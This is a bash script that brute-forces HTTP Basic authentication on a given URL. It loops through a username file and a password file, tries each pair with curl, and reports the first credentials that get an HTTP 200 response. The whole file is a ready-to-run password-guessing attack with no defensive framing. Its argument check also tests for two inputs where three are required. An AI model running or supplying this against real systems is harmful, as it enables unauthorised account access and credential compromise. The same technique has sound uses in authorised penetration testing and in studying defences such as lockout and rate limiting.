#!/bin/bash

echo -e "\n************PASSWORDS************\n"

# Input validation
if [ $# -lt 2 ]; then
  echo "Usage: $0 <url> <usernames_file> <passwords_file>"
  exit 1
fi

url=$1
usernames_file=$2
passwords_file=$3

# Loop through each username and password combination
while read username; do
  while read password; do
    echo "Trying ${username}:${password}..."
    result=$(curl -s -o /dev/null -w '%{http_code}' -u ${username}:${password} ${url})
    if [ $result -eq 200 ]; then
      echo -e "\n\n\nLogin successful with credentials: ${username}:${password}\n\n\n"
      exit 0
    fi
  done < "$passwords_file"
done < "$usernames_file"

echo -e "\n\n\nUnable to find valid credentials\n\n\n"
exit 1

